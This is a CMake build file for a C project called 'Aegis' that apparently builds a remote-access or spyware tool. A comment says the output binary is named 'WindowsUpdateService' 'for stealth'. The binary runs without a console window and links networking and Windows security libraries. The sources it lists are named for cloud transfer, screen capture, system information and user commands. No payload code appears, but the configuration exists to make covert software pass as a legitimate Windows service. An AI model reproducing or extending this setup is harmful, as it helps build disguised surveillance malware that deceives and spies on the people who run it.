cmake_minimum_required(VERSION 3.29.3)

project(Aegis C)

set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/${CMAKE_BUILD_TYPE})

# The desired final executable name for stealth
set(STEALTH_EXE_NAME "WindowsUpdateService")
set(CMAKE_CXX_STANDARD 17)
enable_language(RC)

if(WIN32)

    set(RESOURCE_FILE update.rc)

    # Let CMake/MSVC handle the .rc resource file by adding it to the target sources.
    # Do not use a custom COMMAND that invokes RC directly (that produced the missing update.res).
    file(GLOB_RECURSE PROJECT_SOURCES
        ${CMAKE_CURRENT_SOURCE_DIR}/src/*.c
    )

    # Collect headers so they show up in Visual Studio Solution Explorer
    file(GLOB_RECURSE PROJECT_HEADERS
        ${CMAKE_CURRENT_SOURCE_DIR}/include/*.h
        ${CMAKE_CURRENT_SOURCE_DIR}/include/*.hpp
    )

    # Add the .rc file (source-level) so MSVC's resource compiler will generate update.res in the right place
    list(APPEND PROJECT_SOURCES
        ${CMAKE_CURRENT_SOURCE_DIR}/${RESOURCE_FILE}
    )

    add_executable(${PROJECT_NAME}
        ${PROJECT_SOURCES}
        ${PROJECT_HEADERS}
    )

    # Mark headers as header-only so IDE treats them as headers (not compile units)
    if(PROJECT_HEADERS)
        set_source_files_properties(${PROJECT_HEADERS} PROPERTIES HEADER_FILE_ONLY TRUE)
    endif()

    include_directories(${CMAKE_CURRENT_SOURCE_DIR}/include)

    set_target_properties(${PROJECT_NAME} PROPERTIES 
        OUTPUT_NAME ${STEALTH_EXE_NAME}
        LINK_FLAGS "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup"
    )

    target_link_libraries(${PROJECT_NAME} PRIVATE ws2_32 advapi32)

else()
    add_executable(${PROJECT_NAME} 
        src/main.c
        src/cloudtransfer.c
        src/lookscreen.c
        src/sysinfo.c 
        src/usercommands.c
    )
endif()

set(CMAKE_CXX_FLAGS_DEBUG "${CMAKE_CXX_FLAGS_DEBUG} -g")
set(CMAKE_C_FLAGS_DEBUG "${CMAKE_C_FLAGS_DEBUG} -g")